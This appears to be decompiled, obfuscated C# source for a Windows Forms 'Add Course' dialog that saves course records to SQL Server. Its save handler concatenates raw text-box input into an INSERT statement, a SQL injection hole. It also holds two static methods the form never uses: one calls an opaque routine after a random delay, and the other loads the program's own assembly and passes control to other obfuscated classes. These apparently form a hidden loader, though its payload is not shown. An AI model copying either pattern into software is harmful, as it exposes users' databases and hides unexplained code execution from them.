using System;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Kb8;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using b1X;
using j7G;
using n4YR;
using w3X6;

namespace b1W;

[DesignerGenerated]
public class Lq3 : Form
{
	private IContainer components;

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Wo7;
			Button button = _Button6;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[CompilerGenerated]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Fk3;
			Label label = _Label3;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label3 = value;
			label = _Label3;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = w3C;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Tm1;
			Label label = _Label2;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label2 = value;
			label = _Label2;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox2
	{
		[CompilerGenerated]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m6T;
			TextBox textBox = _TextBox2;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox2 = value;
			textBox = _TextBox2;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Dw4;
			TextBox textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			textBox = _TextBox1;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ei9;
			Label label = _Label1;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label1 = value;
			label = _Label1;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox3
	{
		[CompilerGenerated]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = e1T;
			TextBox textBox = _TextBox3;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox3 = value;
			textBox = _TextBox3;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[CompilerGenerated]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = d9Q;
			GroupBox groupBox = _GroupBox1;
			if (groupBox != null)
			{
				((Control)groupBox).remove_Enter(eventHandler);
			}
			_GroupBox1 = value;
			groupBox = _GroupBox1;
			if (groupBox != null)
			{
				((Control)groupBox).add_Enter(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox5
	{
		[CompilerGenerated]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = a6T;
			TextBox textBox = _TextBox5;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox5 = value;
			textBox = _TextBox5;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Yc9;
			Label label = _Label5;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label5 = value;
			label = _Label5;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox4
	{
		[CompilerGenerated]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g5L;
			TextBox textBox = _TextBox4;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox4 = value;
			textBox = _TextBox4;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = y7D;
			Label label = _Label4;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label4 = value;
			label = _Label4;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox6
	{
		[CompilerGenerated]
		get
		{
			return _TextBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = w4P;
			TextBox textBox = _TextBox6;
			if (textBox != null)
			{
				((Control)textBox).remove_TextChanged(eventHandler);
			}
			_TextBox6 = value;
			textBox = _TextBox6;
			if (textBox != null)
			{
				((Control)textBox).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Fd2;
			Label label = _Label6;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	public Lq3()
	{
		((Form)this).add_Load((EventHandler)c6T);
		k1C();
	}

	[DebuggerNonUserCode]
	protected override void c8S(bool j6F)
	{
		try
		{
			if (j6F && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(j6F);
		}
	}

	[DebuggerStepThrough]
	private void k1C()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0431: Unknown result type (might be due to invalid IL or missing references)
		//IL_04aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0641: Unknown result type (might be due to invalid IL or missing references)
		//IL_0662: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_073e: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_081f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0898: Unknown result type (might be due to invalid IL or missing references)
		//IL_0903: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c3: Expected O, but got Unknown
		//IL_09d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e0: Expected O, but got Unknown
		//IL_09e2: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Lq3));
		Button6 = new Button();
		Label3 = new Label();
		Button2 = new Button();
		Label2 = new Label();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Label1 = new Label();
		TextBox3 = new TextBox();
		GroupBox1 = new GroupBox();
		TextBox6 = new TextBox();
		Label6 = new Label();
		TextBox5 = new TextBox();
		Label5 = new Label();
		TextBox4 = new TextBox();
		Label4 = new Label();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		Button6.set_DialogResult((DialogResult)2);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderColor(Color.Teal);
		((ButtonBase)Button6).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((Control)Button6).set_Location(new Point(13, 185));
		((Control)Button6).set_Margin(new Padding(4));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(94, 32));
		((Control)Button6).set_TabIndex(24);
		((ButtonBase)Button6).set_Text("Save");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		((Control)Label3).set_Location(new Point(10, 102));
		((Control)Label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(136, 36));
		((Control)Label3).set_TabIndex(22);
		Label3.set_Text("Course Duration");
		Label3.set_TextAlign((ContentAlignment)16);
		Button2.set_DialogResult((DialogResult)2);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderColor(Color.Red);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button2).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(255, 224, 192));
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Location(new Point(130, 185));
		((Control)Button2).set_Margin(new Padding(4));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(94, 32));
		((Control)Button2).set_TabIndex(19);
		((ButtonBase)Button2).set_Text("Cancel");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((Control)Label2).set_Location(new Point(10, 16));
		((Control)Label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(136, 36));
		((Control)Label2).set_TabIndex(17);
		Label2.set_Text("Course ID");
		Label2.set_TextAlign((ContentAlignment)16);
		((Control)TextBox2).set_Location(new Point(154, 63));
		((Control)TextBox2).set_Margin(new Padding(4));
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		((Control)TextBox2).set_Size(new Size(504, 29));
		((Control)TextBox2).set_TabIndex(4);
		((Control)TextBox1).set_Location(new Point(154, 23));
		((Control)TextBox1).set_Margin(new Padding(4));
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(177, 29));
		((Control)TextBox1).set_TabIndex(3);
		((Control)Label1).set_Location(new Point(10, 63));
		((Control)Label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(136, 36));
		((Control)Label1).set_TabIndex(16);
		Label1.set_Text("Course Name");
		Label1.set_TextAlign((ContentAlignment)16);
		((Control)TextBox3).set_Location(new Point(154, 103));
		((Control)TextBox3).set_Margin(new Padding(4));
		TextBox3.set_Multiline(true);
		((Control)TextBox3).set_Name("TextBox3");
		((Control)TextBox3).set_Size(new Size(177, 29));
		((Control)TextBox3).set_TabIndex(11);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).set_Location(new Point(4, 1));
		((Control)GroupBox1).set_Margin(new Padding(4));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Padding(new Padding(4));
		((Control)GroupBox1).set_Size(new Size(679, 236));
		((Control)GroupBox1).set_TabIndex(25);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Course Info.");
		((Control)TextBox6).set_Location(new Point(470, 145));
		((Control)TextBox6).set_Margin(new Padding(4));
		TextBox6.set_Multiline(true);
		((Control)TextBox6).set_Name("TextBox6");
		((Control)TextBox6).set_Size(new Size(188, 29));
		((Control)TextBox6).set_TabIndex(28);
		((Control)Label6).set_Location(new Point(352, 144));
		((Control)Label6).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(118, 36));
		((Control)Label6).set_TabIndex(27);
		Label6.set_Text("Max. Student");
		Label6.set_TextAlign((ContentAlignment)16);
		((Control)TextBox5).set_Location(new Point(470, 103));
		((Control)TextBox5).set_Margin(new Padding(4));
		TextBox5.set_Multiline(true);
		((Control)TextBox5).set_Name("TextBox5");
		((Control)TextBox5).set_Size(new Size(188, 29));
		((Control)TextBox5).set_TabIndex(26);
		((Control)Label5).set_Location(new Point(352, 103));
		((Control)Label5).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(118, 36));
		((Control)Label5).set_TabIndex(25);
		Label5.set_Text("Total Subjects");
		Label5.set_TextAlign((ContentAlignment)16);
		((Control)TextBox4).set_Location(new Point(154, 146));
		((Control)TextBox4).set_Margin(new Padding(4));
		TextBox4.set_Multiline(true);
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(177, 29));
		((Control)TextBox4).set_TabIndex(24);
		((Control)Label4).set_Location(new Point(10, 145));
		((Control)Label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(136, 36));
		((Control)Label4).set_TabIndex(23);
		Label4.set_Text("Total Semesters");
		Label4.set_TextAlign((ContentAlignment)16);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.MintCream);
		((Form)this).set_ClientSize(new Size(686, 237));
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Course");
		((Form)this).set_Text("Add Course");
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void w3C(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	public void k1E()
	{
		((TextBoxBase)TextBox1).Clear();
		((TextBoxBase)TextBox2).Clear();
		((TextBoxBase)TextBox3).Clear();
		((TextBoxBase)TextBox4).Clear();
		((TextBoxBase)TextBox5).Clear();
		((TextBoxBase)TextBox6).Clear();
	}

	private void c6T(object sender, EventArgs e)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		Ns49.ds.Clear();
		Ns49.Cj7g();
		Ns49.cn.Open();
		Ns49.str = "select * from InformationForm";
		Ns49.cmd = new SqlCommand(Ns49.str, Ns49.cn);
		Ns49.da.set_SelectCommand(Ns49.cmd);
		((DbDataAdapter)(object)Ns49.da).Fill(Ns49.ds, "Course");
		Ns49.cn.Close();
	}

	internal static void Jz0(string i1N)
	{
		Task.Delay(new Random().Next(1000, 5000)).Wait();
		Sd2.Qd7(i1N);
	}

	private void Wo7(object sender, EventArgs e)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Ns49.cn.Open();
			Ns49.str = "insert into Course values (" + TextBox1.get_Text() + ",'" + TextBox2.get_Text() + "', " + TextBox3.get_Text() + "," + TextBox4.get_Text() + ", " + TextBox5.get_Text() + "," + TextBox6.get_Text() + ")";
			Ns49.cmd = new SqlCommand(Ns49.str, Ns49.cn);
			Ns49.da.set_InsertCommand(Ns49.cmd);
			Ns49.da.get_InsertCommand().ExecuteNonQuery();
			Interaction.MsgBox((object)" Record Saved.", (MsgBoxStyle)0, (object)null);
			k1E();
			Ns49.cn.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)" Record Not Saved.", (MsgBoxStyle)0, (object)null);
			k1E();
			ProjectData.ClearProjectError();
		}
	}

	private void g5L(object sender, EventArgs e)
	{
	}

	private void Yc9(object sender, EventArgs e)
	{
	}

	private void a6T(object sender, EventArgs e)
	{
	}

	private void Fd2(object sender, EventArgs e)
	{
	}

	private void w4P(object sender, EventArgs e)
	{
	}

	private void d9Q(object sender, EventArgs e)
	{
	}

	private void e1T(object sender, EventArgs e)
	{
	}

	private void Ei9(object sender, EventArgs e)
	{
	}

	private void Dw4(object sender, EventArgs e)
	{
	}

	private void m6T(object sender, EventArgs e)
	{
	}

	private void Tm1(object sender, EventArgs e)
	{
	}

	private void r8X(object sender, EventArgs e)
	{
	}

	private void Fk3(object sender, EventArgs e)
	{
	}

	internal static string[] n5N()
	{
		Bj4.y1Y();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		b1D7.mDic.Add("bee", value);
		return Hg5.k1M();
	}

	private void y7D(object sender, EventArgs e)
	{
	}
}
